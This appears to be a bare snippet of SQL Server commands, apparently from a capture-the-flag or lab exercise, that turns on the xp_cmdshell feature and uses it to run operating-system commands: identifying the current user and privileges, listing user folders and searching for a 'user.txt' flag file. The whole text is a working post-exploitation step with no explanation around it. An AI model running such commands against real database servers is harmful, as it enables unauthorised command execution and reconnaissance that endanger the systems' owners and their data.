EXEC sp_configure 'show advanced options', 1; RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE
EXEC xp_cmdshell 'whoami & echo %USERPROFILE% & whoami /priv & dir /b C:\Users & where /r C:\Users user.txt 2>nul'
